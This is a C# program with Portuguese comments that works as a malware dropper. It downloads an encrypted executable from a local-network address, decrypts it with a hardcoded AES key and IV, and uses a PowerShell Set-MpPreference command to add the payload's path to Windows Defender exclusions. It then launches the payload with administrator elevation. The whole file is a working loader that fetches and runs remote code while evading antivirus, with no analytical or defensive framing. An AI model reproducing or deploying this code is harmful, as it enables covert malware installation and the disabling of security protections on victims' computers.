using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public class Program
{
    // Definindo a URL do arquivo criptografado
    private static string url = "http://192.168.1.6/SolutionsSecurity.exe";

    // Definindo a chave de criptografia
    private static byte[] key = new byte[] { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20 };

    // Definindo o vetor de inicialização
    private static byte[] iv = new byte[] { 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30 };

    // Importando funções da API do Windows
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // Definindo a assinatura do delegate para adicionar exclusões ao Windows Defender
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate bool SetDefenderExclusionDelegate(string filePath);

    // Método principal
    public static void Main(string[] args)
    {
        try
        {
            // Tentativa de baixar o arquivo criptografado e descriptografá-lo
            string encryptedFilePath = DownloadFile(url);
            DecryptFile(encryptedFilePath);
        }
        catch (Exception ex)
        {
            // Tratamento de exceção
        }
    }

    // Método para baixar o arquivo criptografado da URL fornecida
    private static string DownloadFile(string url)
    {
        try
        {
            // Diretório temporário do sistema
            string tempDir = Path.GetTempPath();

            // Obtendo o nome do arquivo da URL
            string fileName = Path.GetFileName(url);

            // Caminho completo do arquivo criptografado na pasta temporária
            string filePath = Path.Combine(tempDir, fileName);

            // Baixando o arquivo criptografado
            using (WebClient client = new WebClient())
            {
                Console.WriteLine($"Baixando arquivo criptografado: {fileName}...");
                client.DownloadFile(url, filePath);
                Console.WriteLine("Download completo.");
            }

            return filePath; // Retornando o caminho do arquivo baixado
        }
        catch (Exception ex)
        {

            Console.WriteLine($"Ocorreu um erro durante o download do arquivo: {ex.Message}");
            throw; // Propaga a exceção para o chamador
        }
    }

    // Método para descriptografar o arquivo
    public static void DecryptFile(string inputFile)
    {
        try
        {
            // Diretório temporário do sistema
            string tempDir = Path.GetTempPath();

            // Caminho completo do arquivo descriptografado
            string outputFile = Path.Combine(tempDir, "decrypted_file.exe");

            // Adicionando o arquivo às exclusões do Windows Defender
            AddToWindowsDefenderExclusions(outputFile);

            // Aguardando 10 segundos
            Thread.Sleep(10000);

            // Criando instância de Aes para descriptografar
            using (Aes aesAlg = Aes.Create())
            {
                // Definindo a chave e o vetor de inicialização
                aesAlg.Key = key;
                aesAlg.IV = iv;

                // Lendo o arquivo criptografado e escrevendo o arquivo descriptografado
                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                using (ICryptoTransform decryptor = aesAlg.CreateDecryptor())
                using (CryptoStream cryptoStream = new CryptoStream(fsOutput, decryptor, CryptoStreamMode.Write))
                {
                    byte[] buffer = new byte[4096];
                    int bytesRead;

                    while ((bytesRead = fsInput.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        cryptoStream.Write(buffer, 0, bytesRead);
                    }
                }
            }
            Console.WriteLine("Arquivo descriptografado.");

            // Executando o arquivo descriptografado
            ExecuteFile(outputFile);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Ocorreu um erro ao descriptografar o arquivo: {ex.Message}");
        }
    }

    // Método para adicionar o arquivo às exclusões do Windows Defender
    private static bool AddToWindowsDefenderExclusions(string filePath)
    {
        try
        {
            // Executando o PowerShell como administrador
            using (Process process = new Process())
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    Verb = "runas",
                    FileName = "powershell",
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };

                // Definindo a codificação padrão da saída e erro do PowerShell
                psi.StandardOutputEncoding = Encoding.UTF8;
                psi.StandardErrorEncoding = Encoding.UTF8;

                // Configurando o processo
                process.StartInfo = psi;
                process.Start();

                // Comando PowerShell para adicionar o caminho à exclusão do Windows Defender
                string command = $"Set-MpPreference -ExclusionPath \"{filePath}\"";

                // Escrevendo o comando no StandardInput
                process.StandardInput.WriteLine(command);
                process.StandardInput.Close();

                // Capturando a saída e os erros do PowerShell
                string output = process.StandardOutput.ReadToEnd();
                string errors = process.StandardError.ReadToEnd();

                // Verificando se houve erros
                if (string.IsNullOrWhiteSpace(errors))
                {
                    Console.WriteLine("Arquivo adicionado às exclusões do Windows Defender.");
                    Thread.Sleep(3000);
                    return true;
                }
                else
                {
                    Console.WriteLine("Erro ao adicionar o arquivo às exclusões do Windows Defender:");
                    Console.WriteLine(errors);
                    return false;
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Ocorreu um erro ao adicionar o arquivo às exclusões do Windows Defender: {ex.Message}");
            return false;
        }
    }

    // Método para executar o arquivo descriptografado
    private static void ExecuteFile(string filePath)
    {
        try
        {
            // Esperando 3 segundos
            Thread.Sleep(3000);

            // Executando o arquivo descriptografado com privilégios elevados
            Console.WriteLine("Executando arquivo descriptografado...");
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = filePath,
                Verb = "runas" // Solicitando elevação para administrador
            };
            Process.Start(psi);
            Console.WriteLine("Arquivo executado.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Ocorreu um erro ao executar o arquivo: {ex.Message}");
        }
    }
}
